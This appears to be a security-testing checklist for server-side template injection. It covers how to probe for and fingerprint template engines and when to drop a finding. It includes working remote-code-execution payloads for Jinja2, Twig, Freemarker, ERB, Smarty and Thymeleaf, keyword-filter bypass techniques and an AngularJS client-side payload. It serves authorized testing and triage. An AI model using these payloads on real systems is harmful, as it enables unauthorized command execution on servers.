# SSTI — Server-Side Template Injection (ssti)

User input evaluated by a server-side template engine. Confirm evaluation
(`49` from `{{7*7}}`), fingerprint the engine, then escalate to the engine's
known RCE gadget.

## Checklist
- Find reflection points that flow into a template: name/bio/subject fields, email/invoice/PDF templates, filenames, search terms echoed in results, error pages, and reflected headers.
- Probe with arithmetic polyglots that only evaluate in a template: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`, `@(7*7)`; a `49` in the output means evaluation.
- Distinguish from plain XSS: `{{7*7}}` rendering `49` is SSTI; the same string reflected literally is not.
- Fingerprint the engine: `{{7*'7'}}` -> `7777777` (Jinja2) vs `49` (Twig); `${7*7}` (Freemarker/Velocity); `#{}` (Ruby/Mako); `*{}` (Thymeleaf); `{{}}` with no math (AngularJS -> client-side CSTI).
- Escalate Jinja2 (Python): walk `{{''.__class__.__mro__}}` / `{{config}}` to reach `os`, e.g. `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or `cycler`/`lipsum`/`request` gadgets.
- Escalate Twig (PHP): `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` or `{{['id']|filter('system')}}`.
- Escalate Freemarker (Java): `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`; Velocity via `$class.inspect(...)`.
- Escalate ERB/Ruby (`<%= \`id\` %>`), Smarty (`{php}` / `{system(...)}`), and Thymeleaf (`${T(java.lang.Runtime).getRuntime().exec(...)}`).
- Sandbox awareness: try the engine's documented sandbox escapes before concluding "sandboxed" — many escape via reflection/filter gadgets.
- Blind SSTI: when output is not reflected (a rendered PDF/email), confirm via OOB — a payload that makes the server fetch your collaborator URL or sleep.
- Separate client-side template injection (AngularJS `{{constructor.constructor('alert(1)')()}}`, Vue) — that is CSTI/XSS, route it to the xss checklist.
- Prove impact with a benign command (`id`/`whoami`) or file read; do not run destructive commands and keep within scope.

## Bypasses
- Attribute access instead of blocked keywords: `request['application']['__globals__']`, `[]`-indexing instead of `.`.
- String obfuscation: build `os`/`system` from concatenation, `|attr()`, `request.args`, hex/char codes to dodge keyword blacklists.
- Alternate gadgets when `__globals__`/`config` is filtered: `cycler`, `joiner`, `namespace`, `lipsum`, `url_for.__globals__`.
- Whitespace/newline and comment insertion inside `{{ }}` where the sanitiser trims naively.
- Encode the payload (unicode, HTML entities decoded before templating) and nest `{{ }}` expressions.
- Use the engine's own filters (`|map`, `|filter`, `|attr`) to call functions when direct calls are blocked.

## Kill rules
- `{{7*7}}` is reflected literally (or as `7*7`), not evaluated to `49` — no template evaluation, likely just XSS/reflection.
- The `49` appears but only client-side (AngularJS) — that is CSTI/XSS, triage there, not RCE.
- Evaluation works but the sandbox genuinely blocks every escalation gadget and no data/command is reachable — info at best.
- You cannot reproduce the evaluation, or it depends on your own admin-only template editor (self-impact/expected).
- The render happens in a documented user-controlled template feature with no cross-tenant or server impact.
- The injection point/host is out of scope.
